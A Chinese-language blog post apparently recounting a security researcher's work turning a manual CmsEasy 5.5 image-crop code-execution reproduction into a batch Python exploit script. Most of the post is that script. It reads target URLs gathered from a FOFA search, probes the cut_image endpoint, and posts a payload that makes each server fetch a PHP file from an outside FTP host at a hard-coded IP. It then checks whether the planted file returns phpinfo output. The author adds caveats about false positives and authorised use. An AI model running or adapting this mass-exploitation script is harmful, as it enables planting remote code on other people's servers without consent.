ailx10说：这篇是我2024年7月写的。鸡爪流 day1，我把前面手工做过的 CmsEasy 图像裁剪流程收成脚本。先找版本和接口线索，再上传处理图片、解析生成路径，最后看能不能得到 phpinfo，结果写到 CSV。手工时靠眼睛顺手完成的事情，自动化以后都得变成明确判断，路径、返回和失败分支一个都绕不过。这篇记录的是从单个实验到程序流程的尝试，而不是发现了一条新漏洞；看到一个错误字符串，只能说明走到了某个入口，后面的动作还得逐步确认。

---

day1将CmsEasy图像裁剪案例封装批量脚本，识别版本与IMAGE NOT FOUND后上传处理图片，解析生成文件路径并以PHP Version回显判定，写CSV。

核查提示：错误字符串仅表明端点存在，不直接证明漏洞；无超时且子目录pic固定1，未知版本也进入验证，上传与访问修改目标数据，本文只作原理和审阅记录。 原实验和代码未重新运行，图内细节有待核验。

本文整理历史 CmsEasy 图像裁剪漏洞的验证思路：识别版本和响应特征，再检查上传处理后的文件。脚本可能在目标上写入文件，应仅用于授权的隔离环境。

- 找到对应的POC：[ailx10：CmsEasy 5.5 代码执行漏洞复现](/posts/a0369/)
- 找到对应的网站：FOFA搜索`body="CmsEasy"`

下面是原记录中的示例代码；其输入、异常处理和作用范围需要结合实验环境审查。

原记录展示批量验证结果。端点返回 IMAGE NOT FOUND 只能说明接口存在，并不能单独证明漏洞。

```
import re
import os
import csv
import requests
from datetime import datetime

class CmsEasy5():
    def __init__(self):
        self.version = "-1"
        self.vuln_exist = "-1"
        self.vuln_success_url = "-1"
        self.vuln_success_result = "-1"

    def check_vulnerability(self,url):
        try:
            response = requests.get(url)
            pattern = r"CmsEasy\s+(\d+\_\d+\_\d+\_\d{8})"
            match = re.search(pattern,response.text)
            if match:
                self.version = match.group(1)
                print("CmsEasy版本:{}".format(self.version))
            else:
                print("CmsEasy版本:未知")

            post_cut_image_url = "{}/index.php?case=tool&act=cut_image".format(url)
            response = requests.get(post_cut_image_url)
            if 'IMAGE NOT FOUND!' in response.text:
                print("vuln exist")
                self.vuln_exist = 1
                return True
            else:
                print("no vuln")
                self.vuln_exist = 0
                return False
        except Exception as e:
            print("网络异常:{}".format(e))
            return False


    def verify_exploit_success(self,url,path_name,file_name):
        if path_name and file_name:
            self.vuln_success_url = "{}/upload/images/{}/{}.php".format(url,path_name,file_name)
            print("漏洞验证:{}".format(self.vuln_success_url))
            response = requests.get(self.vuln_success_url)
            if "PHP Version" in response.text:
                print("vuln success")
                self.vuln_success_result = 1
                return True
            else:
                print("vuln failed:no PHP Version")
                self.vuln_success_result = 0
                return False
        else:
            print("vuln failed:path_name={} and file_name={}".format(path_name,file_name))
            self.vuln_success_result = -1
            return False

    def exploit_vulnerability(self,url):
        path_name = ""
        file_name = ""
        post_cut_image_url = "{}/index.php?case=tool&act=cut_image".format(url)
        data_to_post = {
            'pic': '1ftp://144.34.162.13/1.php',
            'w': 700,
            'h': 286,
            'x1': 0,
            'x2': 700,
            'y1': 0,
            'y2': 286
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            response = requests.post(post_cut_image_url, data=data_to_post, headers=headers)
            res_text = response.text
            print("POC载荷返回内容:{}".format(res_text))
            if "success" in res_text or "成功" in res_text or "#thumb" in res_text:
                pattern = r"\('#thumb'\).val\('\\/upload\\/images\\/(\d{6})\\/(\d+).php'\)"
                match = re.search(pattern, res_text)
                if match:
                    path_name = match.group(1)
                    file_name = match.group(2)
                else:
                    print("没有匹配到上传的PHP文件信息")
        except Exception as e:
            print("请求异常:{}".format(e))

        return path_name,file_name

    def append_data_to_csv(self,file_name, data):
        file_path = os.path.join(os.getcwd(), file_name)
        file_exists = False
        if os.path.exists(file_path):
            file_exists = True
        with open(file_path, 'a+', newline='') as csvfile:
            writer = csv.writer(csvfile)
            if not file_exists:
                writer.writerow(data.keys())
            writer.writerow(data.values())

if __name__ == "__main__":
    test_url_list = []
    now = datetime.now()
    date_string = now.strftime("%Y-%m-%d")
    with open('url.txt', 'r', encoding='utf-8') as file:
        for line in file:
            test_url_list.append(line.strip())
    for url in test_url_list:
        cms = CmsEasy5()
        url = url[:-1] if url.endswith("/") else url
        if cms.check_vulnerability(url):
            path_name,file_name = cms.exploit_vulnerability(url)
            vuln_success_result = cms.verify_exploit_success(url,path_name,file_name)

        url_vuln_info = {
                "url":url,
                "version":cms.version,
                "vuln_exist":cms.vuln_exist,
                "vuln_success_url":cms.vuln_success_url,
                "vuln_success_result":cms.vuln_success_result,
                "date_string":date_string
            }
        cms.append_data_to_csv("out.csv",url_vuln_info)
```

自动化会把一次误判放大成很多次误判。错误提示只能当线索，上传后的实际内容才更接近结果；脚本输出一行“成功”之前，我希望能把这条证据链留完整。
